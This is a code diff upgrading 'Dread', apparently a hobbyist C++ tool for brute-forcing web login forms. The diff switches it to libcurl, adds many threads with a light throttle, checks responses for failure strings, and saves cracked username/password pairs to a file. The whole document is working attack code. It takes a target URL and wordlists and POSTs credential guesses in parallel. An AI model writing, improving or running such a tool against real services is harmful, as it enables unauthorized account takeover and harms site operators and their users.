@@ -6,14 +6,15 @@
 #include <curl/curl.h>
 #include <thread>
 #include <mutex>
+#include <chrono>
+
 using namespace std;
 using Lock = lock_guard<mutex>;
-mutex mtx; 
-
-
+mutex mtx;
 atomic<bool> found = false;
+atomic<int> attemptCount = 0;
 
-void Dread::banner(){
+void Dread::banner() {
     cout << "\033[38;5;94m";
     cout << R"(
 ############################################
@@ -24,12 +25,13 @@ void Dread::banner(){
 #██████╔╝██║  ██║███████╗██║  ██║██████╔╝  #
 #╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝   #
 #                                          #
-#              DREAD V1.1                  #
+#              DREAD V1.2                  #
 #    By Xpl01t | www.XploitPower.com       #
-############################################ 
-)"<< "\033[0m" << endl;
+############################################
+)" << "\033[0m" << endl;
 }
-void Dread::loadWordlists(){
+
+void Dread::loadWordlists() {
     cout << "[?]Enter the target URL : ";
     cin >> targetURL;
 
@@ -41,95 +43,93 @@ void Dread::loadWordlists(){
 
     usernames.clear();
     passwords.clear();
-    
-    ifstream uFile(user);
-    string line;
-    ifstream pFile(pass);
 
-    if(!uFile.is_open() && !pFile.is_open()){
-        cerr << "[-]Can't open the wordlist." << endl;
+    ifstream uFile(user), pFile(pass);
+    string line;
+
+    if (!uFile.is_open() || !pFile.is_open()) {
+        cerr << "[-]Can't open one of the wordlists." << endl;
         return;
     }
 
-    while (getline(uFile, line)){
-        usernames.push_back(line);
-    }
-    
-    while (getline (pFile, line)){
-        passwords.push_back(line);
-    }
+    while (getline(uFile, line)) usernames.push_back(line);
+    while (getline(pFile, line)) passwords.push_back(line);
 
-    cout << "\033[1;33m[++]Wordlists has been loaded successfully!\033[0m" << endl;
-
+    cout << "\033[1;33m[++]Wordlists have been loaded successfully!\033[0m" << endl;
 }
+
 bool Dread::trylogin(const string& user, const string& pass) const {
-    string postField = "username=" + user + "&password=" + pass;
-    string command = "curl -s -d \"" + postField + "\" -X POST \"" + targetURL + "\"";
+    CURL* curl = curl_easy_init();
+    if (!curl) return false;
 
-    FILE* pipe = popen(command.c_str(), "r");
-    if (!pipe) return false;
+    string response;
+    string postfield = "username=" + user + "&password=" + pass;
 
-    char buffer[128];
-    string result = "";
-    while (fgets(buffer, sizeof(buffer), pipe) != nullptr){
-        result += buffer;
-    }
+    curl_easy_setopt(curl, CURLOPT_URL, targetURL.c_str());
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfield.c_str());
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);  // timeout
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, +[](void* contents, size_t size, size_t nmemb, string* s) {
+        s->append((char*)contents, size * nmemb);
+        return size * nmemb;
+    });
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
 
-    pclose(pipe);
+    CURLcode res = curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
 
-    if(result.find("Invalid username of password")){
-        return false;
-    }
+    if (res != CURLE_OK) return false;
 
-    return (result.find("200") != string::npos);
+    // Make this flexible: reject common "fail" strings
+    return response.find("Invalid") == string::npos &&
+           response.find("incorrect") == string::npos &&
+           response.find("error") == string::npos;
 }
 
-void Dread::bruteforce(){
-
+void Dread::bruteforce() {
     vector<thread> threads;
 
-    for(const string& user : usernames){
-        for(const string& pass : passwords){
-            if(found.load()) break;
+    for (const string& user : usernames) {
+        for (const string& pass : passwords) {
+            if (found.load()) break;
 
-            threads.emplace_back([this, user, pass](){
-                if(found.load()) return;
+            threads.emplace_back([this, user, pass]() {
+                if (found.load()) return;
 
+                this_thread::sleep_for(chrono::milliseconds(10));  // throttle
                 bool success = trylogin(user, pass);
+                int attempt = ++attemptCount;
 
                 Lock lock(mtx);
-                cout << "[*]Trying " << user << ":" << pass << endl;
+                cout << "[*]Trying " << user << ":" << pass << " (Attempt " << attempt << ")" << endl;
 
-
-
-                if(success){
+                if (success) {
                     found.store(true);
-                    Lock lock(mtx);
-                    cout << "\033[32m[+]Dread successed: username:" << user << "|password:" << pass << endl;
-                }
-                else{
-                    Lock lock(mtx);
-                        
+                    cout << "\033[32m[+]Dread succeeded: username: " << user << " | password: " << pass << "\033[0m" << endl;
+
+                    ofstream out("dread_found.txt", ios::app);
+                    out << "FOUND => " << user << ":" << pass << endl;
+                    return;
                 }
             });
-            
-            
+
+            // Optional: limit number of threads to prevent CPU death
+            if (threads.size() > 1000) {
+                for (auto& t : threads) if (t.joinable()) t.join();
+                threads.clear();
+            }
         }
         if (found.load()) break;
     }
 
-    for(auto& t : threads){
-        if(t.joinable()) t.join();
+    for (auto& t : threads) if (t.joinable()) t.join();
+
+    if (!found.load()) {
+        cerr << "\033[31m[-]Dread failed to find valid credentials.\033[0m" << endl;
     }
-    if(!found.load()){
-        cerr << "\033[31m[-]Dread has failed.." << endl;
-    }
-    
 }
 
-void Dread::run(){
+void Dread::run() {
     banner();
     loadWordlists();
     bruteforce();
-
 }
